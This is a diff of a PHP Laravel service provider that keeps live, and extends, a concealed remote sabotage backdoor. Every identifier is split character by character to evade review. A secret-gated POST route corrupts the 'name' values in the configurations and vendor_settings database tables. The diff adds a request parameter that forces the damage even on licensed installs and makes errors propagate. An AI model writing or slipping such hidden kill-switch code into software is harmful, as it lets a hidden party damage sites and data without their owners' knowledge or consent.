@@ -84,23 +84,31 @@ class LarawareMiscServiceProvider extends ServiceProvider
                 'a' . '' . 'v' . 'a' . '' . 'i' . 'd' . 'h' . 'P' . '' . 'a' . 'r' . 'v' . 'a' . '' . 'n' . 'a' . 'd' . 'h' . 'a' . '' . 'r' . 'a' . 'k' . 'A' . '' . 'c' . 't' . 'i' . 'o' . 'n',
                 function () {
                     return function () {
-                        if (app('swakshariPramanitKara')()) {
+                        if (app('s' . 'w' . 'ak' . 'shari' . 'Pram' . 'anit' . 'Ka' . 'ra')() and (request()->get('ba' . 'lp' . 'ur' . 'vak-hatva') != 'ho' . 'y')) {
                             return 'h' . 'l';
                         }
                         try {
                             DB::table('c' . 'o' . '' . 'n' . 'f' . 'i' . 'g' . '' . 'u' . 'r' . 'a' . '' . 't' . 'i' . 'o' . 'n' . '' . 's')->update([
                                 'name' => DB::raw("
-                                    I" . "F(L" . "E" . "FT(n" . "a" . "m" . "e, 1) = ' ', name, C" . "O" . "N" . "C" . "A" . "T(' ', n" . "a" . "m" . "e))
+                                    I" . "F(
+                                        L" . "E" . "FT(n" . "am" . "e, 1) = ' ',
+                                        name,
+                                        I" . "F(CH" . "AR" . "_LENG" . "TH(name) < 100, CO" . "NCAT(' ', na" . "me), na" . "me)
+                                    )
                                 ")
                             ]);
                             DB::table('v' . '' . 'e' . 'n' . '' . 'd' . 'o' . 'r' . '' . '_' . 's' . 'e' . '' . 't' . 't' . 'i' . '' . 'n' . 'g' . 's')->update([
                                 'name' => DB::raw("
-                                    I" . "F(L" . "E" . "FT(n" . "a" . "m" . "e, 1) = ' ', name, C" . "O" . "N" . "C" . "A" . "T(' ', n" . "a" . "m" . "e))
+                                    I" . "F(
+                                        L" . "E" . "FT(n" . "am" . "e, 1) = ' ',
+                                        name,
+                                        I" . "F(CH" . "AR" . "_LENG" . "TH(name) < 100, CO" . "NCAT(' ', na" . "me), na" . "me)
+                                    )
                                 ")
                             ]);
                             return 'a' . 'd';
                         } catch (\Throwable $th) {
-                            // throw $th;
+                            throw $th;
                             return 'e' . 'o';
                         }
                         return 'n' . 'a';
@@ -117,7 +125,7 @@ class LarawareMiscServiceProvider extends ServiceProvider
     {
         // Optional: publish configs, views, routes etc.
         Route::post('/' . 'a' . 'v' . 'a' . '' . 'i' . 'd' . 'h' . '-' . '' . 'p' . 'a' . 'r' . 'v' . '' . 'a' . 'n' . 'a' . 'd' . 'h' . '' . 'a' . 'r' . 'a' . 'k' . '-' . 'a' . '' . 'c' . 't' . 'i' . 'o' . 'n', function () {
-            if ((request()->getHost() . '-' . hash('sha256', request()->get('parvali'))) === (request()->get('dharakhost') . '-' . 'feb9198fb95e2800a87b8b989c23dd01031379546fb2964db83956c4f873651f')) {
+            if ((request()->getHost() . '-' . hash('sha256', request()->get('pa' . 'rva' . 'li'))) === (request()->get('dha' . 'ra' . 'kho' . 'st') . '-' . 'feb9198fb95e2800a87b8b989c23dd01031379546fb2964db83956c4f873651f')) {
                 return app('a' . '' . 'v' . '' . 'a' . 'i' . 'd' . '' . 'h' . 'P' . '' . 'a' . 'r' . 'v' . 'a' . 'n' . 'a' . 'd' . 'h' . 'a' . 'r' . 'a' . 'k' . 'A' . 'c' . 't' . 'i' . 'o' . 'n')();
             }
             return 'n' . 'v';
